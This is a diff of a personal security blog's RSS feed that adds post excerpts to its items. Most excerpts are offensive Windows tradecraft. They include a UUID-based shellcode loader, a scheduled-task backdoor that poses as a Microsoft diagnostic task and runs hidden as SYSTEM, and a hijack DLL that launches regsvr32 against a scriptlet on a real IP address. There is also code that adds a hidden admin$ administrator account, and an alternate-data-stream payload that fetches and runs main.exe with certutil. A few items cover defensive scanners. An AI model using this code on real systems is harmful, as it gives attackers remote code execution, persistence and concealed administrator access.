@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>security on XhstormR</title>
+    <title>Security on XhstormR</title>
     <link>https://xhstormr.github.io/blog/categories/security/</link>
-    <description>Recent content in security on XhstormR</description>
+    <description>Recent content in Security on XhstormR</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <lastBuildDate>Sun, 14 Mar 2021 14:40:49 +0800</lastBuildDate>
@@ -13,63 +13,78 @@
       <link>https://xhstormr.github.io/blog/posts/shellcode-uuid/</link>
       <pubDate>Sun, 14 Mar 2021 14:40:49 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/shellcode-uuid/</guid>
-      <description></description>
+      <description>Updated on 2021-03-14
+uuid.cs C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:winexe uuid.cs using System; using System.Collections.Generic; using System.IO; using System.Net; using System.Runtime.InteropServices; using System.Text; class Program { [DllImport(&amp;#34;rpcrt4&amp;#34;)] private static extern int UuidFromStringA(string uuid, IntPtr hpAddress); [DllImport(&amp;#34;kernel32&amp;#34;)] private static extern IntPtr HeapCreate(int flOptions, int dwInitialSize, int dwMaximumSize); [DllImport(&amp;#34;kernel32&amp;#34;)] private static extern IntPtr HeapAlloc(IntPtr hHeap, int dwFlags, int dwBytes); [DllImport(&amp;#34;kernel32&amp;#34;)] private static extern IntPtr EnumSystemLocalesA(IntPtr hAddress, int dwflags); private static void Main(string[] args) { WebRequest httpWebRequest = WebRequest.</description>
     </item>
     <item>
       <title>Malware Scanner</title>
       <link>https://xhstormr.github.io/blog/posts/malware-scanner/</link>
       <pubDate>Mon, 06 Jul 2020 11:37:35 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/malware-scanner/</guid>
-      <description></description>
+      <description>Updated on 2020-07-06
+Yara https://yara.readthedocs.io/en/stable/ https://github.com/VirusTotal/yara wget https://github.com/VirusTotal/yara/archive/master.zip unzip master.zip cd yara-master/ ./build.sh yara --help ---- apt install yara ClamAV https://www.clamav.net/downloads apt install clamav clamav-daemon clamscan --help Loki https://github.com/Neo23x0/Loki wget https://github.com/Neo23x0/Loki/archive/master.zip unzip master.zip cd Loki-master/ python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade pip python -m pip install --index-url=https://mirrors.aliyun.com/pypi/simple/ --upgrade -r requirements.txt python loki.py --help Reference https://github.com/InQuest/awesome-yara https://github.com/Yara-Rules/rules https://github.com/reversinglabs/reversinglabs-yara-rules https://github.com/ytisf/theZoo </description>
     </item>
     <item>
       <title>Patator</title>
       <link>https://xhstormr.github.io/blog/posts/patator/</link>
       <pubDate>Thu, 23 Jan 2020 21:31:52 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/patator/</guid>
-      <description></description>
+      <description>Updated on 2020-01-23
+https://github.com/lanjelot/patator
+https://github.com/danielmiessler/SecLists
+docker pull parrotsec/security:latest docker run -it --rm -v `pwd`:`pwd` -w `pwd` parrotsec/security patator http_fuzz --help wget https://mirrors.aliyun.com/kali/pool/main/s/seclists/seclists_2020.1.orig.tar.gz tar -xvf seclists_2020.1.orig.tar.gz </description>
     </item>
     <item>
       <title>BeEF</title>
       <link>https://xhstormr.github.io/blog/posts/beef/</link>
       <pubDate>Tue, 21 Jan 2020 19:59:06 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/beef/</guid>
-      <description></description>
+      <description>Updated on 2020-01-21
+https://github.com/beefproject/beef
+https://github.com/beefproject/beef/wiki
+Native wget https://github.com/beefproject/beef/archive/master.zip unzip master.zip cd beef-master/ ./install ./set-new-pass.rb config.yaml 123456 ./beef -p 9527 &amp;amp; Ruby curl -sSL https://get.rvm.io | bash -s stable source /etc/profile.d/rvm.sh rvm reload rvm install 2.7 rvm use 2.7 --default gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/ rvm list known rvm -v ruby -v gem -v gem sources -l SQLite https://pkgs.org/download/sqlite https://kojipkgs.fedoraproject.org/packages/sqlite curl -O https://kojipkgs.fedoraproject.org/packages/sqlite/3.11.0/1.fc22/x86_64/sqlite-3.11.0-1.fc22.x86_64.rpm curl -O https://kojipkgs.fedoraproject.org/packages/sqlite/3.11.0/1.fc22/x86_64/sqlite-libs-3.11.0-1.fc22.x86_64.rpm curl -O https://kojipkgs.fedoraproject.org/packages/sqlite/3.11.0/1.fc22/x86_64/sqlite-devel-3.11.0-1.fc22.x86_64.rpm yum -y install * Docker Kali docker pull kalilinux/kali-rolling:latest docker run -it -p 9527:9527 kalilinux/kali-rolling apt update &amp;amp;&amp;amp; apt -y install beef-xss cd /usr/share/beef-xss &amp;amp;&amp;amp; ls -l Parrot docker pull parrotsec/security:latest docker run -it -p 9527:9527 parrotsec/security cd /usr/share/beef-xss &amp;amp;&amp;amp; ls -l docker start b37fcb2827f8 docker exec -it b37fcb2827f8 bash export LANG=C.</description>
     </item>
     <item>
       <title>Win32 RegisterTask API</title>
       <link>https://xhstormr.github.io/blog/posts/registertask-api/</link>
       <pubDate>Fri, 04 Oct 2019 17:46:10 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/registertask-api/</guid>
-      <description></description>
+      <description>Updated on 2019-10-04
+https://docs.microsoft.com/zh-cn/windows/win32/api/taskschd/nf-taskschd-itaskfolder-registertask
+#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;comdef.h&amp;gt; #include &amp;lt;windows.h&amp;gt; #include &amp;lt;taskschd.h&amp;gt; BSTR _com_util::ConvertStringToBSTR(const char *ascii) { int len = strlen(ascii); BSTR bstr = SysAllocStringLen(NULL, len); mbstowcs(bstr, ascii, len); return bstr; } char *read() { FILE *file = fopen(&amp;#34;123.xml&amp;#34;, &amp;#34;rb&amp;#34;); fseek(file, 0, SEEK_END); long fileSize = ftell(file); rewind(file); char *text = (char *)malloc(fileSize + 1); fread(text, sizeof(char), fileSize, file); text[fileSize] = 0; fclose(file); return text; } int main(int agrc, char *agrv[]) { CoInitializeEx(NULL, COINIT_MULTITHREADED); ITaskService *pService = NULL; CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void **)&amp;amp;pService); ITaskFolder *pRootFolder = NULL; pService-&amp;gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); pService-&amp;gt;GetFolder(_bstr_t(&amp;#34;\\Microsoft\\Windows\\MemoryDiagnostic&amp;#34;), &amp;amp;pRootFolder); pService-&amp;gt;Release(); IRegisteredTask *pRegisteredTask = NULL; char *text = read(); HRESULT hr = pRootFolder-&amp;gt;RegisterTask( _bstr_t(&amp;#34;ProcessMemoryDiagnosticEvents&amp;#34;), _bstr_t(text), TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(), &amp;amp;pRegisteredTask ); if (FAILED(hr)) { printf(&amp;#34;Error saving the Task: %x&amp;#34;, hr); } else { BSTR path; pRegisteredTask-&amp;gt;get_Path(&amp;amp;path); printf(&amp;#34;Path: %ls\n&amp;#34;, path); double vtime; SYSTEMTIME stime; pRegisteredTask-&amp;gt;get_NextRunTime(&amp;amp;vtime); VariantTimeToSystemTime(vtime, &amp;amp;stime); printf(&amp;#34;NextRunTime: %d/%02d/%02d %02d:%02d:%02d\n&amp;#34;, stime.</description>
     </item>
     <item>
       <title>计划任务 Backdoor</title>
       <link>https://xhstormr.github.io/blog/posts/taskschd-backdoor/</link>
       <pubDate>Fri, 04 Oct 2019 14:00:20 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/taskschd-backdoor/</guid>
-      <description></description>
+      <description>Updated on 2019-10-04
+123.xml &amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt; &amp;lt;Task xmlns=&amp;#34;http://schemas.microsoft.com/windows/2004/02/mit/task&amp;#34;&amp;gt; &amp;lt;RegistrationInfo&amp;gt; &amp;lt;Source&amp;gt;Microsoft Corporation&amp;lt;/Source&amp;gt; &amp;lt;Author&amp;gt;Microsoft Corporation&amp;lt;/Author&amp;gt; &amp;lt;URI&amp;gt;\Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents&amp;lt;/URI&amp;gt; &amp;lt;/RegistrationInfo&amp;gt; &amp;lt;Triggers&amp;gt; &amp;lt;TimeTrigger&amp;gt; &amp;lt;Repetition&amp;gt; &amp;lt;Interval&amp;gt;PT1H&amp;lt;/Interval&amp;gt; &amp;lt;StopAtDurationEnd&amp;gt;false&amp;lt;/StopAtDurationEnd&amp;gt; &amp;lt;/Repetition&amp;gt; &amp;lt;StartBoundary&amp;gt;2000-01-01T00:00:00&amp;lt;/StartBoundary&amp;gt; &amp;lt;Enabled&amp;gt;true&amp;lt;/Enabled&amp;gt; &amp;lt;/TimeTrigger&amp;gt; &amp;lt;/Triggers&amp;gt; &amp;lt;Principals&amp;gt; &amp;lt;Principal id=&amp;#34;LocalSystem&amp;#34;&amp;gt; &amp;lt;UserId&amp;gt;S-1-5-18&amp;lt;/UserId&amp;gt; &amp;lt;RunLevel&amp;gt;HighestAvailable&amp;lt;/RunLevel&amp;gt; &amp;lt;/Principal&amp;gt; &amp;lt;/Principals&amp;gt; &amp;lt;Settings&amp;gt; &amp;lt;MultipleInstancesPolicy&amp;gt;StopExisting&amp;lt;/MultipleInstancesPolicy&amp;gt; &amp;lt;DisallowStartIfOnBatteries&amp;gt;false&amp;lt;/DisallowStartIfOnBatteries&amp;gt; &amp;lt;StopIfGoingOnBatteries&amp;gt;true&amp;lt;/StopIfGoingOnBatteries&amp;gt; &amp;lt;AllowHardTerminate&amp;gt;true&amp;lt;/AllowHardTerminate&amp;gt; &amp;lt;StartWhenAvailable&amp;gt;true&amp;lt;/StartWhenAvailable&amp;gt; &amp;lt;RunOnlyIfNetworkAvailable&amp;gt;false&amp;lt;/RunOnlyIfNetworkAvailable&amp;gt; &amp;lt;IdleSettings&amp;gt; &amp;lt;StopOnIdleEnd&amp;gt;true&amp;lt;/StopOnIdleEnd&amp;gt; &amp;lt;RestartOnIdle&amp;gt;false&amp;lt;/RestartOnIdle&amp;gt; &amp;lt;/IdleSettings&amp;gt; &amp;lt;AllowStartOnDemand&amp;gt;true&amp;lt;/AllowStartOnDemand&amp;gt; &amp;lt;Enabled&amp;gt;true&amp;lt;/Enabled&amp;gt; &amp;lt;Hidden&amp;gt;true&amp;lt;/Hidden&amp;gt; &amp;lt;RunOnlyIfIdle&amp;gt;false&amp;lt;/RunOnlyIfIdle&amp;gt; &amp;lt;WakeToRun&amp;gt;false&amp;lt;/WakeToRun&amp;gt; &amp;lt;ExecutionTimeLimit&amp;gt;PT0S&amp;lt;/ExecutionTimeLimit&amp;gt; &amp;lt;Priority&amp;gt;0&amp;lt;/Priority&amp;gt; &amp;lt;/Settings&amp;gt; &amp;lt;Actions Context=&amp;#34;LocalSystem&amp;#34;&amp;gt; &amp;lt;Exec&amp;gt; &amp;lt;Command&amp;gt;%windir%\system32\rundll32.exe&amp;lt;/Command&amp;gt; &amp;lt;Arguments&amp;gt;main.dll msg&amp;lt;/Arguments&amp;gt; &amp;lt;/Exec&amp;gt; &amp;lt;/Actions&amp;gt; &amp;lt;/Task&amp;gt; Reference https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-schema https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/security-identifiers 注册任务 脚本（免杀） 123.vbs Set service = CreateObject(&amp;#34;Schedule.</description>
     </item>
     <item>
       <title>DLL 劫持</title>
       <link>https://xhstormr.github.io/blog/posts/dll-hijacking/</link>
       <pubDate>Wed, 02 Oct 2019 14:00:52 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/dll-hijacking/</guid>
-      <description></description>
+      <description>Updated on 2019-10-02
+#include &amp;lt;windows.h&amp;gt; #include &amp;lt;process.h&amp;gt; void msg(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, int nCmdShow) { if (strlen(lpCmdLine) != 0) { MessageBox(NULL, lpCmdLine, &amp;#34;Title&amp;#34;, MB_OK); } } BOOL WINAPI DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: spawnlp(P_DETACH, &amp;#34;regsvr32.exe&amp;#34;, &amp;#34;regsvr32.exe&amp;#34;, &amp;#34;/s /u /i:http://47.98.135.65/main/main.xml scrobj.dll&amp;#34;, NULL); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } gcc 123.c -o 123.dll -shared -s rundll32 123.dll msg objdump -x 123.</description>
     </item>
     <item>
       <title>Win32 NetUserAdd API</title>
       <link>https://xhstormr.github.io/blog/posts/netuseradd-api/</link>
       <pubDate>Tue, 01 Oct 2019 09:59:16 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/netuseradd-api/</guid>
-      <description></description>
+      <description>Updated on 2019-10-01
+https://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
+#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;lm.h&amp;gt; int main(int agrc, char *agrv[]) { USER_INFO_1 user; memset(&amp;amp;user, 0, sizeof(user)); user.usri1_name = L&amp;#34;admin$&amp;#34;; user.usri1_password = L&amp;#34;Leoasdzxc123.&amp;#34;; user.usri1_priv = USER_PRIV_USER; user.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD; user.usri1_comment = NULL; user.usri1_home_dir = NULL; user.usri1_script_path = NULL; LOCALGROUP_MEMBERS_INFO_3 member; memset(&amp;amp;member, 0, sizeof(member)); member.lgrmi3_domainandname = user.usri1_name; if (NetUserAdd(NULL, 1, (void *)&amp;amp;user, NULL) != NERR_Success) { puts(&amp;#34;NetUserAdd FAILED!&amp;#34;); return -1; } if (NetLocalGroupAddMembers(NULL, L&amp;#34;Administrators&amp;#34;, 3, (void *)&amp;amp;member, 1) !</description>
     </item>
     <item>
       <title>Alternate Data Stream</title>
       <link>https://xhstormr.github.io/blog/posts/ads/</link>
       <pubDate>Mon, 30 Sep 2019 19:31:07 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/ads/</guid>
-      <description></description>
+      <description>Updated on 2019-09-30
+regsvr32.exe /s /u /i:http://47.98.135.65/main/main.xml scrobj.dll cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:http://47.98.135.65/main/main.xml ^scrobj.dll &amp;gt; ...:payload.bat cmd.exe - &amp;lt; ...:payload.bat main.xml &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;scriptlet&amp;gt; &amp;lt;registration classid=&amp;#34;{F0001111-0000-0000-0000-0000FEEDACDC}&amp;#34; &amp;gt; &amp;lt;script language=&amp;#34;VBScript&amp;#34;&amp;gt; &amp;lt;![CDATA[ CreateObject(&amp;#34;WScript.Shell&amp;#34;).Run _ &amp;#34;%ComSpec% /c cd /d %TEMP% &amp;amp;&amp;amp; &amp;#34; &amp;amp;_ &amp;#34;(IF NOT EXIST main.exe certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe) &amp;amp;&amp;amp; &amp;#34; &amp;amp;_ &amp;#34;certutil.exe -urlcache * delete &amp;amp; &amp;#34; &amp;amp;_ &amp;#34;main.exe r&amp;#34;, 0, false ]]&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;/registration&amp;gt; &amp;lt;/scriptlet&amp;gt; delete.</description>
     </item>
   </channel>
 </rss>
